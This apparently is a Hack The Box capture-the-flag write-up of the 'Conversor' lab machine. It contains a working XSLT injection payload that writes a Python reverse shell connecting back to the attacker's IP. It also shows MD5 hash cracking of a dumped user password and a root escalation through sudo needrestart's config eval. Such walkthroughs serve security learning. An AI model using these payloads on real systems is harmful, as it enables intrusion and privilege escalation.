---
title:HTB: Conersor
date: 2025-10-28 00:00 +0800
categories: [HTB]
tags: [HTB,Easy,Web Exploitation,XSLT Injection,XML,Eval,needrestart]
image: https://github.com/user-attachments/assets/64271ccd-8bd5-4c05-9c89-03b4ca2f02be
---

<img width="703" height="243" alt="image" src="https://github.com/user-attachments/assets/64271ccd-8bd5-4c05-9c89-03b4ca2f02be" />

Got in by uploading a malicious `XSLT` that wrote a Python file the server’s cron ran, giving me a `www-data` shell. Grabbed the SQLite creds, cracked the MD5 to become `fismathack`, then privesc’d: `needrestart` was **sudo-able** and its -c option loads a config and executes it as code.

## Tools
- nmap
- subl
- searchsploit
- dirsearch
- sqlite3
- hashcat
  
## Recon

Nmap scan result:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Conversor]
└─$ cat nmap-scan.txt 
# Nmap 7.95 scan initiated Mon Oct 27 19:05:46 2025 as: /usr/lib/nmap/nmap --privileged -vvv -p 22,80 -O -sCV -oN nmap-scan2.txt 10.10.11.92
Nmap scan report for 10.10.11.92
Host is up, received echo-reply ttl 63 (0.016s latency).
Scanned at 2025-10-27 19:05:46 +08 for 12s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ9JqBn+xSQHg4I+jiEo+FiiRUhIRrVFyvZWz1pynUb/txOEximgV3lqjMSYxeV/9hieOFZewt/ACQbPhbR/oaE=
|   256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIR1sFcTPihpLp0OemLScFRf8nSrybmPGzOs83oKikw+
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://conversor.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=10/27%OT=22%CT=%CU=40718%PV=Y%DS=2%DC=I%G=N%TM=68FF521
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=9)OPS(
OS:O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11
OS:NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Uptime guess: 28.572 days (since Mon Sep 29 05:21:35 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 27 19:05:58 2025 -- 1 IP address (1 host up) scanned in 11.95 seconds
```

## Initial Enumeration

In the first reconnaissance phase we find that `port 80` redirected to **conversor.htb**. We added those to `/etc/hosts`

We searched for known exploits using **searchsploit** based on the Nmap results, and we did find known vuln:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Conversor]
└─$ searchsploit Apache 2.4.52 
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution       | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner     | php/remote/29316.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                   | multiple/dos/26710.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow  | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflo | unix/remote/47080.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflo | unix/remote/764.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Traversal   | linux/webapps/39642.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing                     | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                   | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)             | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Up | jsp/webapps/42966.py
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Up | windows/webapps/42953.txt
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)          | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Cod | linux/remote/34.pl
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
But still, nothing interesting from known vuln. We also found that it uses **flask** from **[404 error page](https://0xdf.gitlab.io/cheatsheets/404)**

<img width="1182" height="207" alt="image" src="https://github.com/user-attachments/assets/2d54548c-71fe-4a85-982c-207bd4058929" />

Because there were no valid credentials or obvious SSH exploits, we focused on the manual discovery for web service on **port 80** for now. 

## Discovery

Here is **dirsearch** result:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Conversor]
└─$ dirsearch -u conversor.htb
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                        
 (_||| _) (/_(_|| (_| )                                                                                 
                                                                                                        
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/HTB/Conversor/reports/_conversor.htb/_25-10-28_17-33-38.txt

Target: http://conversor.htb/

[17:33:39] Starting:                                                                                    
[17:33:46] 200 -    0B  - /about                                            
[17:33:57] 404 -  275B  - /javascript/tiny_mce                              
[17:33:57] 301 -  319B  - /javascript  ->  http://conversor.htb/javascript/ 
[17:33:57] 404 -  275B  - /javascript/editors/fckeditor
[17:33:58] 200 -  722B  - /login                                            
[17:34:05] 200 -  726B  - /register                                         
[17:34:06] 403 -  278B  - /server-status/                                   
[17:34:06] 403 -  278B  - /server-status                                    
                                                                             
Task Completed                      
```

Nothing much, from **dirsearch**

Need to registered, logged in to **authenticated** before we can do a further discovery:

<img width="1124" height="526" alt="image" src="https://github.com/user-attachments/assets/23adde21-9200-48b7-b33a-df26f436a9c0" />

Once logged in, the dashboard had a upload functions file with`.xml` and `.xslt` to beautify printed **nmap** scan results as `.html`

<img width="1325" height="719" alt="image" src="https://github.com/user-attachments/assets/90322b41-a3c6-44fd-8f71-673e2672f58a" />

in **About** section it shown all developers and copy of source code given 

<img width="1405" height="778" alt="image" src="https://github.com/user-attachments/assets/18bcebd9-08b9-4516-b840-a1675ea97496" />

Combined `.xml` & `.xslt` will give us beautify nmap scan result with `.html`:
<img width="1505" height="380" alt="image" src="https://github.com/user-attachments/assets/30ff6b75-2f0f-4397-82f7-15f897b39d19" />

Source code snippet:

**app.py**:
```
from flask import Flask, render_template, request, redirect, url_for, session, send_from_directory
import os, sqlite3, hashlib, uuid

app = Flask(__name__)
app.secret_key = 'Changemeplease'

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = '/var/www/conversor.htb/instance/users.db'
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def init_db():
    os.makedirs(os.path.join(BASE_DIR, 'instance'), exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS files (
        id TEXT PRIMARY KEY,
        user_id INTEGER,
        filename TEXT,
        FOREIGN KEY(user_id) REFERENCES users(id)
    )''')
    conn.commit()
    conn.close()

init_db()

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

@app.route('/')
def index():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT * FROM files WHERE user_id=?", (session['user_id'],))
    files = cur.fetchall()
    conn.close()
    return render_template('index.html', files=files)

@app.route('/register', methods=['GET','POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = hashlib.md5(request.form['password'].encode()).hexdigest()
        conn = get_db()
        try:
            conn.execute("INSERT INTO users (username,password) VALUES (?,?)", (username,password))
            conn.commit()
            conn.close()
            return redirect(url_for('login'))
        except sqlite3.IntegrityError:
            conn.close()
            return "Username already exists"
    return render_template('register.html')
@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))


@app.route('/about')
def about():
 return render_template('about.html')

@app.route('/login', methods=['GET','POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = hashlib.md5(request.form['password'].encode()).hexdigest()
        conn = get_db()
        cur = conn.cursor()
        cur.execute("SELECT * FROM users WHERE username=? AND password=?", (username,password))
        user = cur.fetchone()
        conn.close()
        if user:
            session['user_id'] = user['id']
            session['username'] = username
            return redirect(url_for('index'))
        else:
            return "Invalid credentials"
    return render_template('login.html')


@app.route('/convert', methods=['POST'])
def convert():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    xml_file = request.files['xml_file']
    xslt_file = request.files['xslt_file']
    from lxml import etree
    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
    xml_file.save(xml_path)
    xslt_file.save(xslt_path)
    try:
        parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
        xml_tree = etree.parse(xml_path, parser)
        xslt_tree = etree.parse(xslt_path)
        transform = etree.XSLT(xslt_tree)
        result_tree = transform(xml_tree)
        result_html = str(result_tree)
        file_id = str(uuid.uuid4())
        filename = f"{file_id}.html"
        html_path = os.path.join(UPLOAD_FOLDER, filename)
        with open(html_path, "w") as f:
            f.write(result_html)
        conn = get_db()
        conn.execute("INSERT INTO files (id,user_id,filename) VALUES (?,?,?)", (file_id, session['user_id'], filename))
        conn.commit()
        conn.close()
        return redirect(url_for('index'))
    except Exception as e:
        return f"Error: {e}"

@app.route('/view/<file_id>')
def view_file(file_id):
    if 'user_id' not in session:
        return redirect(url_for('login'))
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT * FROM files WHERE id=? AND user_id=?", (file_id, session['user_id']))
    file = cur.fetchone()
    conn.close()
    if file:
        return send_from_directory(UPLOAD_FOLDER, file['filename'])
    return "File not found"

```

**install.md**:
```
To deploy Conversor, we can extract the compressed file:

"""
tar -xvf source_code.tar.gz
"""

We install flask:

"""
pip3 install flask
"""

We can run the app.py file:

"""
python3 app.py
"""

You can also run it with Apache using the app.wsgi file.

If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```

We find `app.py`:
- Saves the uploads before any checks
```
xml_file.save(xml_path)
xslt_file.save(xslt_path)  
```

- They hardened the XML parser, but not the XSLT parser. No XSLTAccessControl means libxslt’s extensions are enabled, including EXSLT `exsl:document`, which can write files
```
parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
xml_tree = etree.parse(xml_path, parser)
xslt_tree = etree.parse(xslt_path)
```

From `install.md`:
- Cron job is running  as `www-data` and executing all `.py` files from **/var/www/conversor.htb/scripts/** 

So we can abuse this to get a reverse shell as a `www-data`
Payload used:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Conversor]
└─$ cat nmap.xml 
<a/>
┌──(kali㉿kali)-[~/Desktop/HTB/Conversor]
└─$ cat nmap.xslt 
<!-- write_pwn.xslt -->
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exsl="http://exslt.org/common"
  extension-element-prefixes="exsl">

  <xsl:output method="text"/>

  <xsl:template match="/">
    <!-- write the Python file to the cron-run directory -->
    <exsl:document href="file:///var/www/conversor.htb/scripts/pwn.py" method="text">
      <xsl:text># payload written by XSLT&#10;</xsl:text>
      <xsl:text>import socket,os,pty&#10;</xsl:text>
      <xsl:text>s=socket.create_connection(("10.10.14.94",4444))&#10;</xsl:text>
      <xsl:text>for fd in (0,1,2): os.dup2(s.fileno(),fd)&#10;</xsl:text>
      <xsl:text>pty.spawn("/bin/bash")&#10;</xsl:text>
    </exsl:document>

    <!-- optional: emit something so transform succeeds -->
    <xsl:text>ok</xsl:text>
  </xsl:template>
</xsl:stylesheet>
```
Setup a listener
```
┌──(kali㉿kali)-[~/Desktop]
└─$ penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.134.128 • 10.10.14.94
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```
## Shell as www-data

**BOOM**, here is our Shell!
```
┌──(kali㉿kali)-[~/Desktop]
└─$ penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.134.128 • 10.10.14.94
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from conversor~10.10.11.92-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to deploy Python Agent...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/conversor~10.10.11.92-Linux-x86_64/2025_10_29-11_40_43-658.log 📜
───────────────────────────────────────────────────────────────────────
www-data@conversor:~$ 
```

### sqlite 

```
www-data@conversor:~$ ls
conversor.htb
www-data@conversor:~$ cd conversor.htb/
www-data@conversor:~/conversor.htb$ ls
app.py  app.wsgi  instance  __pycache__  scripts  static  templates  uploads
www-data@conversor:~/conversor.htb$ cd instance/
www-data@conversor:~/conversor.htb/instance$ ls
users.db
www-data@conversor:~/conversor.htb/instance$ sqlite3 users.db 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
files  users
sqlite> select * from users;
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|a|0cc175b9c0f1b6a831c399e269772661
sqlite> 
```

### hashcat (md5)

```
┌──(kali㉿kali)-[~/Desktop/HTB/Conversor]                                                          
└─$ hashcat -hh | grep -i md5                                                                      
      0 | MD5                                                        | Raw Hash
...
┌──(kali㉿kali)-[~/Desktop/HTB/Conversor]
└─$ hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt --username
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i7-11370H @ 3.30GHz, 2930/5861 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (5602 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 5b5c3ac3a1c897c94caad48e6c71fdec
Time.Started.....: Wed Oct 29 12:07:52 2025 (3 secs)
Time.Estimated...: Wed Oct 29 12:07:55 2025 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  3542.7 kH/s (0.25ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10977280/14344385 (76.53%)
Rejected.........: 0/10977280 (0.00%)
Restore.Point....: 10973184/14344385 (76.50%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: KeishayYashi -> Karamba
Hardware.Mon.#01.: Util: 27%

Started: Wed Oct 29 12:07:51 2025
Stopped: Wed Oct 29 12:07:57 2025
┌──(kali㉿kali)-[~/Desktop/HTB/Conversor]
└─$ echo "fismathack:5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm" >> creds.txt
```
We have a credentials for user `fismathack`:`Keepmesafeandwarm`

fismathack is one of the developer based on `About` from **http://conversor.htb**. We also find the user in this machine:
```
www-data@conversor:~/conversor.htb/instance$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
syslog:x:106:113::/home/syslog:/usr/sbin/nologin
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
tss:x:109:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:110:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:111:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
fismathack:x:1000:1000:fismathack:/home/fismathack:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
www-data@conversor:~/conversor.htb/instance$ ls /home
fismathack
```
## Shell as fismathack

### user.txt
change as user `fismathack`
```
www-data@conversor:/home$ su fismathack
Password: 
fismathack@conversor:/home$ cat fismathack/user.txt 
427c265281e11bbd9fe920e9c62fe1ed
```

### discovery

First we find `fismathack` can run **/usr/sbin/needrestart** as `sudo` without needing password
```
fismathack@conversor:/home$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

Reviewing the --help menu, we find `needrestart accepts -c <cfg>`, 
```
fismathack@conversor:~$ sudo /usr/sbin/needrestart -h
Unknown option: h
Usage:

  needrestart [-vn] [-c <cfg>] [-r <mode>] [-f <fe>] [-u <ui>] [-(b|p|o)] [-klw]

    -v          be more verbose
    -q          be quiet
    -m <mode>   set detail level
        e       (e)asy mode
        a       (a)dvanced mode
    -n          set default answer to 'no'
    -c <cfg>    config filename
    -r <mode>   set restart mode
        l       (l)ist only
        i       (i)nteractive restart
        a       (a)utomatically restart
    -b          enable batch mode
    -p          enable nagios plugin mode
    -o          enable OpenMetrics output mode, implies batch mode, cannot be used simultaneously with -p
    -f <fe>     override debconf frontend (DEBIAN_FRONTEND, debconf(7))
    -t <seconds> tolerate interpreter process start times within this value
    -u <ui>     use preferred UI package (-u ? shows available packages)

  By using the following options only the specified checks are performed:
    -k          check for obsolete kernel
    -l          check for obsolete libraries
    -w          check for obsolete CPU microcode

    --help      show this help
    --version   show version information
```
so went for it source code and find that it evals the entire config file as Perl code. 
```
# slurp config file
print STDERR "$LOGPREF eval $opt_c\n" if($nrconf{verbosity} > 1);
eval do {
    local $/;
    open my $fh, $opt_c or die "ERROR: $!\n";
    my $cfg = <$fh>;
    close($fh);
    $cfg;
};
die "Error parsing $opt_c: $@" if($@);
```
Because `needrestart` can be run with **sudo** and lets you load a custom config, **anything** inside that config gets **executed as root**. So we just create a fake config that runs a shell and pass it with `-c`.

## Shell as root
```
fismathack@conversor:/home$ echo 'system("/bin/sh");' > /tmp/nr.conf
fismathack@conversor:/home$ sudo /usr/sbin/needrestart -c /tmp/nr.conf
# whoami
root
# cat /root/root.txt
04e4e9de8223960fd3b2fab4764e26b1
```
